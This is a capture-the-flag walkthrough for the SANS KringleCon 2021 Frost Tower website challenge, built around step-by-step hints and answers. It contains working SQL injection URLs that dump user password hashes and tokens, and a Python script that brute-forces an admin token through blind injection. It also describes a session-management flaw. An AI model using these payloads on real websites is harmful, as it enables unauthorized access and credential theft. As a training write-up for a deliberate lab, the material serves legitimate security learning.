## Summary
At the top right of the main courtyard, after thawing the Frost Tower door and fixing the Frostivator elevator, go to the top floor, Jack's Office. Enter the left room, called Studio, and talk with Ingreta about the Frost website and download the sourcecode. You will practice sourcecode review and web application hacking.

[Back to Table of Contents](https://github.com/minispooner/SANS_KringleCon_2021_Walkthrough/blob/main/README.md)

## Steps
1. Review the sourcecode for flaws. If you aren't able to find anything, you can go complete the Python coding challenges (where you move the little elf to collect candies) and after level 8, the elf there will give you a few hints about where the Frost Tower Website is vulnerable.
<details>
  <summary>The Elf's Hint</summary>
  He tells you to review a couple of lib docs - the npm express-session package (https://www.npmjs.com/package/express-session) and the mysqljs/mysql package (https://github.com/mysqljs/mysql).
</details>

2. Exploit the first vulnerability on the https://staging.jackfrosttower.com/ website
<details>
  <summary>Hint 1</summary>
  The server.js file imports the express-session package. Take a look at how it uses this lib to find developer flaws in session management.
</details>

<details>
  <summary>Hint 2</summary>
  The server.js file assigns the unauthenticated user a session when a certain unauthenticated call is made with certain logic. Try to trigger it and verify a valid session by browsing to the session-protected /dashboard page.
</details>

<details>
  <summary>Hint 3</summary>
  The server.js "/postcontact" method assigns the user a session when certain logic is followed. Try to trigger it and verify a valid session by browsing to the session-protected /dashboard page.
</details>

<details>
  <summary>Answer</summary>
  Submit the /contact form using some email address. Submit the form again, using the same email address. You now have a session and can navigate to /dashboard to confirm.
</details>

3. Exploit the second vulnerability on the https://staging.jackfrosttower.com/ website
<details>
  <summary>Hint 1</summary>
  The server.js file imports the mysql package. Take a look at the official docs to identify potential mistake points where developers may accidentally insecurely implement classes/calls.
</details>

<details>
  <summary>Hint 2</summary>
  The server.js "/detail/:id" method is a good place to look.
</details>

<details>
  <summary>Hint 3</summary>
  The server.js "/detail/:id" method calls the insecure raw() method on the mysql connection to execute a raw query. Try to manipulate the user input to exploit this vulnerability.
</details>

<details>
  <summary>Answer</summary>
  While "/detail/1,1 or 1=1" will successfully return all uniquecontact details, a UNION-based SQL injection will give you all database user password hashes too! You can build this exploit by reviewing the database tables sourcecode.
  https://staging.jackfrosttower.com/detail/1,2,4%20union%20select%20*%20from%20users--
</details>

4. Exploit the second vulnerability...again...
<details>
  <summary>What's this about?...</summary>
  After getting SQL injection and the password hashes, can we login as someone? (I didn't crack any hashes...)
</details>

<details>
  <summary>Hint 1</summary>
  There are some super-protected pages that need special perms on top of a session. Can you figure out how to get in?
</details>

<details>
  <summary>Hint 2</summary>
  Take a look at how the "token" value is used and think about how it can be obtained and used.
</details>

<details>
  <summary>Answer</summary>
  I bruteforced the Super Admin token (mxCamxRUVgBWr3l7uFR8uUbuQcAa496e) and reset their password and logged in as them. Code below. (CHANGE THE SESSION ID IN THE CODE!)

```
import requests, string
ALL = list(string.ascii_letters)
ALL.extend(string.digits)
print(ALL)
FINAL = ''

def test():
    global FINAL
    for injection in ALL:
        url = 'https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20users%20where%20id=1%20and%20token%20like%20%22HERE%25%22--'
        url = url.replace('HERE',FINAL + injection)

        r = requests.get(
            url,
            cookies={"connect.sid": "YOUR SESSION ID"}
        )
        # print(r.status_code)
        # print(r.text)
        if r.status_code!=200:
            FINAL = FINAL + injection
            print("FINAL: ", FINAL)
            if len(FINAL)==32:
                exit('DONE')

for i in range(0,32):
    test()

print('DONE')
```

</details>

<details>
  <summary>Alternative (better) Answer</summary>
  Use comma-less JOINs for arbitrary data SELECTs.
  https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(select%20token%20from%20users%20where%20id%20=1)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
</details>

5. Exploit the second vulnerability...for the final answer!
<details>
  <summary>Hint 1</summary>
  Where could the todo list be? Enumerate the DB tables using the JOINs above.
</details>

<details>
  <summary>Hint 2</summary>
  The DB likely blocks FUNCTION calls and the INFORMATION_SCHEMA.COLUMNS table, so you have to bruteforce/enum the col names manually - or with BurpSuite Intruder!
</details>

<details>
  <summary>Answer</summary>
  Run this through BurpSuite Intruder
 
  /detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(%20SELECT%20§1§%20FROM%20todo)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
  
  And set the inject point to the "1" (already done in example above) in the "select 1 from todo" query. I used this wordlist:
  
  https://github.com/drtychai/wordlists/blob/master/sqlmap/common-columns.txt 
  
  Then I filtered results by length and found the two largest were id and note.
  Answer:
  
  https://staging.jackfrosttower.com/detail/1,1%20union%20select%20*%20from%20((select%201)A%20join%20(%20SELECT%20note%20FROM%20todo)B%20join%20(select%20%22%22)C%20join%20(select%20%22%22)D%20join%20(select%20%22%22)E%20join%20(select%20%22%22)F%20join%20(select%20%22%22)G)--
</details>
